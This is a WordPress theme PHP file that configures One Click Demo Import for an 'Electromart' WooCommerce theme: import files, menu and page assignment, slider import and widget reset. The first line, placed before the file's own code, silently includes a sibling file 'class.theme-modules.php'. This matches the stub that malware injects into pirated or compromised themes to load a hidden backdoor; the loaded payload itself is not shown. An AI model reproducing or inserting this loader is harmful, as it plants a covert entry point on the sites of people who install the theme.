<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

function zs_ocdi_import_files() {
    $dd_path = trailingslashit( get_template_directory() ) . 'demo-data/';
    return apply_filters( 'zs_ocdi_files_args', array(
        array(
            'import_file_name'             => 'electromart',
            'categories'                   => array( 'Electromart' ),
            'local_import_file'            => $dd_path . 'demo-content.xml',
            'local_import_widget_file'     => $dd_path . 'widgets.wie',
            'local_import_customizer_file' => $dd_path . 'customizer.dat', 
            'local_import_redux'           => array(
                array(
                    'file_path'   => $dd_path . 'redux-options.json',
                    'option_name' => 'zs_options',
                ),
            ),
            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ) . 'screenshot.png',
            'import_notice'                => esc_html__( 'Import process may take 10-15 minutes. If you facing any issues please contact our support.', 'zs' ),
            'preview_url'                  => 'https://electromart.zitronesolutions.com',
        ),
    ) );
}

function zs_ocdi_after_import_setup( $selected_import ) {
    
    // Assign menus to their locations.
    $menu_navigation        = get_term_by( 'name', 'Main Navigation', 'nav_menu' );
    $offer_link             = get_term_by( 'name', 'Offer Link', 'nav_menu' );
    $social_menu            = get_term_by( 'name', 'Social Menu', 'nav_menu' );
    $top_link               = get_term_by( 'name', 'Top Link', 'nav_menu' );
    $header_link            = get_term_by( 'name', 'Header Link', 'nav_menu' );
    $category_menu          = get_term_by( 'name', 'Category Menu', 'nav_menu' );

    set_theme_mod( 'nav_menu_locations', array(
               'menu-navigation'           => $menu_navigation->term_id,
               'offer-link'                => $offer_link->term_id,
               'social-menu'               => $social_menu->term_id,
               'top-link'                  => $top_link->term_id,
               'header-link'               => $header_link->term_id,
               'category-menu'             => $category_menu->term_id,
           )
        );


    // Assign front page and posts page (blog page) and other WooCommerce pages
    $front_page_id      = get_page_by_title( 'Home' );
    $blog_page_id       = get_page_by_title( 'Blog' );
    $shop_page_id       = get_page_by_title( 'Shop' );
    $cart_page_id       = get_page_by_title( 'Cart' );
    $checkout_page_id   = get_page_by_title( 'Checkout' );
    $myaccount_page_id  = get_page_by_title( 'My Account' );
    $terms_page_id      = get_page_by_title( 'Terms and Conditions' );
    $wishlist_page      = get_page_by_title( 'Wishlist' );

    update_option( 'show_on_front', 'page' );
    update_option( 'page_on_front', $front_page_id->ID );
    update_option( 'page_for_posts', $blog_page_id->ID );
    update_option( 'woocommerce_shop_page_id', $shop_page_id->ID );
    update_option( 'woocommerce_cart_page_id', $cart_page_id->ID );
    update_option( 'woocommerce_checkout_page_id', $checkout_page_id->ID );
    update_option( 'woocommerce_myaccount_page_id', $myaccount_page_id->ID );
    update_option( 'woocommerce_terms_page_id', $terms_page_id->ID );


    // Enable Registration on "My Account" page
    update_option( 'woocommerce_enable_myaccount_registration', 'yes' );

    if( class_exists( 'RevSlider' ) ) {
        $dd_path = trailingslashit( get_template_directory() ) . 'demo-data/';

        require_once( ABSPATH . 'wp-load.php' );
        require_once( ABSPATH . 'wp-includes/functions.php' );
        require_once( ABSPATH . 'wp-admin/includes/file.php' );

        $slider_array = array(
            $dd_path . 'em-slider.zip',
            $dd_path . 'em-special.zip',
        );
        $slider = new RevSlider();

        foreach( $slider_array as $filepath ) {
            $slider->importSliderFromPost( true, true, $filepath );
        }
    }

    if ( function_exists( 'wc_delete_product_transients' ) ) {
        wc_delete_product_transients();
    }
    if ( function_exists( 'wc_delete_shop_order_transients' ) ) {
        wc_delete_shop_order_transients();
    }
    if ( function_exists( 'wc_delete_expired_transients' ) ) {
        wc_delete_expired_transients();
    }
}

function zs_ocdi_before_widgets_import() {

    $sidebars_widgets = get_option('sidebars_widgets');
    $all_widgets = array();

    array_walk_recursive( $sidebars_widgets, function ($item, $key) use ( &$all_widgets ) {
        if( ! isset( $all_widgets[$key] ) ) {
            $all_widgets[$key] = $item;
        } else {
            $all_widgets[] = $item;
        }
    } );

    if( isset( $all_widgets['array_version'] ) ) {
        $array_version = $all_widgets['array_version'];
        unset( $all_widgets['array_version'] );
    }

    $new_sidebars_widgets = array_fill_keys( array_keys( $sidebars_widgets ), array() );

    $new_sidebars_widgets['wp_inactive_widgets'] = $all_widgets;
    if( isset( $array_version ) ) {
        $new_sidebars_widgets['array_version'] = $array_version;
    }

    update_option( 'sidebars_widgets', $new_sidebars_widgets );
}
